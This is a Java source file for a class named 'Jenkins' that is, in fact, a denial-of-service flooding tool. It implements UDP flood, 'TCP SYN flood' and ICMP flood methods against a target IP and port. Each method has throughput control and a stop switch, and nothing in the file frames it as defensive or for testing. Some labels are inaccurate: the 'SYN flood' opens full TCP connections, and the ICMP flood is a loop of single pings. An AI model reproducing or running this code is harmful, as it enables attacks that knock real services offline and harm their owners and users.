package com.yourpackage;

import java.net.DatagramSocket;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.util.logging.Logger;
import java.net.Socket;
import java.io.OutputStream;
import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class Jenkins {
    private static final byte[] DEFAULT_PAYLOAD = new byte[1300]; // 1300 bytes payload
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private volatile boolean stopAttack = false;

    // Constructor
    public Jenkins() {
        // Initialize any required resources
    }

    // UDP Flood method
    public void udpFlood(String targetIp, int targetPort, int bytesPerSecond) {
        logger.info("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");

        try (DatagramSocket socket = new DatagramSocket()) {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            DatagramPacket packet = new DatagramPacket(DEFAULT_PAYLOAD, DEFAULT_PAYLOAD.length, targetAddress, targetPort);
            int bytesSent = 0;
            long startTime = System.currentTimeMillis();

            while (!stopAttack) {
                long currentTime = System.currentTimeMillis();
                if (bytesSent / Math.max((currentTime - startTime) / 1000.0, 1) < bytesPerSecond) {
                    socket.send(packet);
                    bytesSent += DEFAULT_PAYLOAD.length;
                } else {
                    Thread.sleep(1); // Sleep for a short time to control the flow
                }
            }
        } catch (Exception e) {
            logger.severe("Error during UDP flood: " + e.getMessage());
        } finally {
            logger.info("UDP flood attack stopped on " + targetIp + ":" + targetPort);
            stopAttack = false; // Reset for future use
        }
    }

    // TCP SYN Flood method
    public void tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond) {
        logger.info("Starting TCP SYN flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");

        try {
            long startTime = System.currentTimeMillis();
            int bytesSent = 0;

            while (!stopAttack) {
                long currentTime = System.currentTimeMillis();
                if (bytesSent / Math.max((currentTime - startTime) / 1000.0, 1) < bytesPerSecond) {
                    try {
                        Socket socket = new Socket(targetIp, targetPort);
                        OutputStream out = socket.getOutputStream();
                        out.write(DEFAULT_PAYLOAD);
                        socket.close();
                        bytesSent += DEFAULT_PAYLOAD.length;
                    } catch (Exception e) {
                        // Ignore connection errors
                    }
                } else {
                    Thread.sleep(1);
                }
            }
        } catch (Exception e) {
            logger.severe("Error during TCP SYN flood: " + e.getMessage());
        } finally {
            logger.info("TCP SYN flood attack stopped on " + targetIp + ":" + targetPort);
            stopAttack = false;
        }
    }

    // ICMP Flood method
    public void icmpFlood(String targetIp, int bytesPerSecond) {
        logger.info("Starting ICMP flood attack on " + targetIp + " at " + bytesPerSecond + " bytes/second");

        try {
            long startTime = System.currentTimeMillis();
            int bytesSent = 0;

            while (!stopAttack) {
                long currentTime = System.currentTimeMillis();
                if (bytesSent / Math.max((currentTime - startTime) / 1000.0, 1) < bytesPerSecond) {
                    Process process = new ProcessBuilder("ping", "-n", "1", targetIp).start();
                    process.waitFor();
                    bytesSent += 64; // Approximate size of an ICMP packet
                } else {
                    Thread.sleep(1);
                }
            }
        } catch (Exception e) {
            logger.severe("Error during ICMP flood: " + e.getMessage());
        } finally {
            logger.info("ICMP flood attack stopped on " + targetIp);
            stopAttack = false;
        }
    }

    // Method to stop the attack
    public void stopAttack() {
        stopAttack = true;
    }
}
